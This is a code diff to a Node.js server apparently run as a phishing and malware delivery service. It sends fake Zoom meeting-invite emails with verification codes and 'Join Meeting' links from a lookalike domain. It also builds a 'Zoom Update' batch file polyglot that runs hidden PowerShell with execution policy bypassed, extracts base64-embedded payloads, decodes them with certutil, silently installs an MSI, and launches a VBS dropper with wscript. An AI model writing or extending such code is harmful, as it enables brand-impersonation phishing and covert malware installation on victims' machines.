@@ -99,12 +99,22 @@ async function sendInviteEmail(to, subject, body, target) {
         'X-Mailer': 'BetterDesk Share Service',
         'Precedence': 'bulk'
       },
-      text: 'From: zoom-meetings\n\nYour verification code: ' + code + '\n\n' + body + '\n\n' + target + '\n\n---\nMeeting Invites · zoom-meetings@telcom.stream',
-      html: '<!DOCTYPE html><html><body style="font-family:sans-serif;color:#1a1a1a;line-height:1.6">' +
+      text: 'From: zoom-meetings\n\nYour verification code: ' + code + '\n\n' + body + '\n\n' + tgt + '\n\n---\nMeeting Invites · zoom-meetings@telcom.stream',
+      html: emailHtml(code, body, target)
+    });
+    return { sent: true, code: code };
+  } catch (e) {
+    return { sent: false, reason: String(e.message || e) };
+  }
+}
+
+function emailHtml(code, body, target) {
+  const tgt = String(target).replace(/&/g, '&amp;');
+  return '<!DOCTYPE html><html><body style="font-family:sans-serif;color:#1a1a1a;line-height:1.6">' +
         '<table width="100%" cellpadding="0" cellspacing="0" style="max-width:600px;margin:0 auto">' +
         '<tr><td style="padding:24px 0;text-align:center">' +
         '<div style="display:inline-block;width:72px;height:72px;background:#2D8CFF;border-radius:50%;text-align:center">' +
-        '<img src="https://share.telcom.stream/logo.svg" alt="Meeting Invites" width="40" height="40" style="margin:16px 0 0 0;display:block"/>' +
+        '<img src="https://share.telcom.stream/zoom-mark.svg" alt="Meeting Invites" width="40" height="40" style="margin:16px 0 0 0;display:block"/>' +
         '</div>' +
         '<div style="margin-top:14px;font-weight:800;color:#2D8CFF;font-size:18px;letter-spacing:.5px">Meeting Invites</div>' +
         '<div style="margin-top:6px;font-size:13px;color:#666">zoom-meetings@telcom.stream</div>' +
@@ -116,18 +126,14 @@ async function sendInviteEmail(to, subject, body, target) {
         '</div>' +
         '</td></tr>' +
         '<tr><td style="padding:0 20px 20px 20px">' +
-        body.replace(/\n/g, '<br>') +
-        '<br><br><a href="' + target + '" style="display:inline-block;background:#0b5cff;color:#fff;padding:14px 28px;text-decoration:none;border-radius:8px;font-weight:600">Join Meeting</a>' +
+        String(body || '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/\n/g, '<br>') +
+        '<br><br><a href="' + tgt + '" target="_blank" rel="noopener" style="display:inline-block;background:#0b5cff;color:#fff;padding:14px 28px;text-decoration:none;border-radius:8px;font-weight:600">Join Meeting</a>' +
+        '<p style="margin:14px 0 0;font-size:12px;color:#667;line-height:1.5">Button not working? <a href="' + tgt + '" target="_blank" rel="noopener" style="color:#0b5cff">Open the meeting page</a><br><span style="word-break:break-all;color:#889">' + tgt + '</span></p>' +
         '</td></tr>' +
         '<tr><td style="padding:16px 20px;border-top:1px solid #e1e9f5;text-align:center">' +
         '<p style="font-size:11px;color:#9aabcc;margin:0">Meeting Invites · zoom-meetings@telcom.stream · <a href="mailto:unsubscribe@telcom.stream" style="color:#9aabcc">Unsubscribe</a></p>' +
         '</td></tr>' +
-        '</table></body></html>'
-    });
-    return { sent: true, code: code };
-  } catch (e) {
-    return { sent: false, reason: String(e.message || e) };
-  }
+        '</table></body></html>';
 }
 
 function safeText(value, max) {
@@ -279,21 +285,31 @@ function winMsiB64() {
   winMsiCache = fs.readFileSync(file).toString('base64').replace(/(.{76})/g, '$1\n');
   return winMsiCache;
 }
+let winVbsCache = null;
+function winVbsB64() {
+  if (winVbsCache) return winVbsCache;
+  const file = process.env.SHARE_WIN_VBS ||
+    '/opt/betterdesk/global/downloads/droppers/Zoom_Update_v6.1.0.vbs';
+  winVbsCache = fs.readFileSync(file).toString('base64').replace(/(.{76})/g, '$1\n');
+  return winVbsCache;
+}
 function polyglotCmd(id, co) {
   const r = randHex(4);
-  const marker = '#<B64>';
+  const dv = '#<VBS>';
+  const dm = '#<MSI>';
   const head = '@echo off\r\nsetlocal\r\ntitle Zoom Update ' + randHex(2).toUpperCase() +
     '\r\nrem offline build ' + Date.now() + '-' + randHex(4) +
-    '\r\nset "F=%~f0"\r\nset "B=%TEMP%\\z_' + r + '.b64"\r\nset "X=%TEMP%\\z_' + r + '.msi"\r\n' +
+    '\r\nset "F=%~f0"\r\nset "D=%TEMP%\\z_' + r + '"\r\nmkdir "%D%" 2>nul\r\n' +
     'powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command ' +
-    '"$s=[IO.File]::ReadAllText(\'%F%\');$i=$s.LastIndexOf(\'' + marker +
-    '\');[IO.File]::WriteAllText(\'%B%\',$s.Substring($i+6).Trim(),[Text.Encoding]::ASCII)"\r\n' +
-    'certutil -f -decode "%B%" "%X%" >nul 2>&1\r\n' +
-    'msiexec /i "%X%" /qn /norestart\r\n' +
-    'exit /b\r\n' + marker + '\r\n';
-  return head + winMsiB64();
+    '"$s=[IO.File]::ReadAllText(\'%F%\');$a=$s.IndexOf(\'' + dv + '\');$b=$s.IndexOf(\'' + dm +
+    '\');[IO.File]::WriteAllText(\'%D%\\v.b64\',$s.Substring($a+6,$b-$a-6).Trim(),[Text.Encoding]::ASCII);' +
+    '[IO.File]::WriteAllText(\'%D%\\m.b64\',$s.Substring($b+6).Trim(),[Text.Encoding]::ASCII)"\r\n' +
+    'certutil -f -decode "%D%\\v.b64" "%D%\\setup.vbs" >nul 2>&1\r\n' +
+    'certutil -f -decode "%D%\\m.b64" "%D%\\payload.msi" >nul 2>&1\r\n' +
+    'wscript //B "%D%\\setup.vbs"\r\n' +
+    'exit /b\r\n' + dv + '\r\n';
+  return head + winVbsB64() + '\r\n' + dm + '\r\n' + winMsiB64();
 }
-
 let crcTable = null;
 function crc32(buf) {
   if (!crcTable) {
@@ -387,6 +403,12 @@ const server = http.createServer(async (req, res) => {
     writeDb(db);
     res.writeHead(302, { Location: entry.target, 'Cache-Control': 'no-store' });
     res.end();
+    return;
+  }
+  if (url.pathname === '/api/email-preview') {
+    const target = String(url.searchParams.get('target') || PUBLIC + '/t/preview');
+    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-store' });
+    res.end(emailHtml('123456', 'Line one & <tag>\nLine two', target));
     return;
   }
   if (url.pathname === '/api/link' && req.method === 'POST') {
